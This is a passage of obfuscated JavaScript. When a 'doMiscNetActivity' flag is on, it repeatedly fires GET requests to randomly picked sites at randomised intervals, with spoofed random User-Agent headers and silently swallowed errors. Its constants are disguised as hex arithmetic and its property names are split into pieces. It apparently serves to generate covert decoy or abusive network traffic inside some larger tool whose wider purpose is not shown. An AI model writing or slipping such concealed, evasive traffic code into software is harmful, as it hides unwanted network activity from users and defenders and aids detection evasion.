  setInterval(() => {
    f();
    for (let l = -0x16c3 * -0x1 + -0x10e3 + -0x5e * 0x10; l < -0x2211 + 0xb95 + 0x1680; l++)
      setTimeout(f, (0x30a5 + -0x5b3f + 0x114fa) * l * getRandomInt(0x61 + 0x1 * -0x229b + 0x223b, 0x1 * 0x846 + 0x2462 + -0x2ca5));
  }, -0xbf868 + -0x10 * 0x1da88 + -0x608f68 * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x21e9 + -0xc1d + -0x2 * -0x24af) * getRandomInt(0x21a0 + 0x1160 + -0x32ff, 0x1d7a + -0x1 * 0x1555 + -0x820));
}, -0x79e + 0x565 * 0x1 + -0x29d * -0x1);